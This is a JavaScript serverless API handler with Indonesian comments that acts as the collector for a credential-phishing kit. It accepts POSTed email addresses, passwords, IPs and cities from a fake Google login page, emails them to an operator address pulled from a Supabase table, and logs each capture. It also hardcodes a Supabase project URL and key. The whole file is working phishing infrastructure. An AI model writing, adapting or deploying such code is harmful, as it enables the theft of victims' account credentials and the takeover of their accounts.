export const config = { api: { bodyParser: true } };

function countryFlag(code){
    if (!code || code.length !== 2) return "";
    const codePoints = code.toUpperCase().split("").map(function(c){ return 127397 + c.charCodeAt(0); });
    return String.fromCodePoint.apply(null, codePoints);
}

export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") return res.status(200).end();
    if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

    const API_KEY = process.env.RESEND_API_KEY;
    if (!API_KEY) return res.status(500).json({ error: "API_KEY_MISSING" });

    try {
        let d = req.body;
        if (typeof d === "string") d = JSON.parse(d);
        if (!d) return res.status(400).json({ error: "BODY_EMPTY" });

        // ==========================================
        // GANTI URL & KEY SUPABASE LU DI SINI BANGSAT!
        // ==========================================
        const SUPABASE_URL = "https://djradeolrbjmgoxxbdlj.supabase.co"; 
        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcmFkZW9scmJqbWdveHhiZGxqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTU1OTA0NDQsImV4cCI6MjExMTE2NjQ0NH0.RvLrul0eFafGUcOn_9ORB8xh3IaP4n1FAsEmqXnrXCA";     
        
        let EMAIL = process.env.RESS_EMAIL || "admin@domain.com";
        let NAMA = process.env.RESS_NAME || "RESS KENZO";

        // 1. AMBIL CONFIG (EMAIL TUJUAN & NAMA RESS) DARI SUPABASE
        try {
            const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?id=eq.1&select=*`, {
                headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` }
            });
            const cfgData = await rCfg.json();
            if (cfgData && cfgData[0]) {
                if (cfgData[0].email_tujuan) EMAIL = cfgData[0].email_tujuan;
                if (cfgData[0].nama_ress) NAMA = cfgData[0].nama_ress;
            }
        } catch(e) { console.log("Gagal ambil config:", e); }

        const flag = countryFlag(d.negaraKode || "");
        const previewText = "ID | +62 | LOGIN Google | IP " + (d.ip || "-");

        // 2. BIKIN HTML EMAIL
        const htmlBody = `
        <div style="display:none;max-height:0;overflow:hidden;font-size:1px;line-height:1px;color:#fff">${previewText}</div>
        <div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:20px">
          <div style="max-width:600px;margin:auto;background:#fff;border-radius:10px;overflow:hidden">
            <div style="background:linear-gradient(135deg,#667eea,#764ba2);padding:25px;text-align:center;color:#fff">
              <h1 style="margin:0;font-size:22px">🥷 ${NAMA} 🥷</h1>
            </div>
            <div style="padding:25px">
              <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:0">📧 ACCOUNT INFO</h3>
              <table style="width:100%;font-size:14px;border-collapse:collapse">
                <tr><td style="padding:10px;font-weight:bold;width:35%">EMAIL</td><td style="padding:10px">${d.email || "-"}</td></tr>
                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PASSWORD</td><td style="padding:10px">${d.password || "-"}</td></tr>
              </table>
              <h3 style="color:#1a73e8;border-bottom:2px solid #1a73e8;padding-bottom:8px;margin-top:30px">📍 LOCATION INFO</h3>
              <table style="width:100%;font-size:14px;border-collapse:collapse">
                <tr><td style="padding:10px;font-weight:bold;width:35%">ALAMAT IP</td><td style="padding:10px">${d.ip || "-"}</td></tr>
                <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">KOTA</td><td style="padding:10px">${d.kota || "-"}</td></tr>
              </table>
            </div>
            <div style="background:#333;color:#fff;padding:15px;text-align:center;font-size:12px">${NAMA} - Real Data Stream</div>
          </div>
        </div>`;

        // 3. KIRIM EMAIL PAKE RESEND
        const response = await fetch("https://api.resend.com/emails", {
            method: "POST",
            headers: { "Authorization": "Bearer " + API_KEY, "Content-Type": "application/json" },
            body: JSON.stringify({
                from: NAMA + " <onboarding@resend.dev>",
                to: [EMAIL],
                subject: "🥷 " + NAMA + " 🥷 | IP " + (d.ip || "-"),
                html: htmlBody
            })
        });

        const data = await response.json();

        // 4. KALO EMAIL BERHASIL, CATAT STATISTIK KE SUPABASE
        if (response.ok) {
            try {
                await fetch(`${SUPABASE_URL}/rest/v1/logs_result`, {
                    method: "POST",
                    headers: { 
                        "apikey": SUPABASE_KEY, 
                        "Authorization": `Bearer ${SUPABASE_KEY}`,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ created_at: new Date().toISOString() })
                });
            } catch(e) { console.log("Gagal nyatet log:", e); }
        }

        return res.status(response.status).json(data);

    } catch (error) {
        return res.status(500).json({ error: "CATCH_ERROR", message: error.message });
    }
}
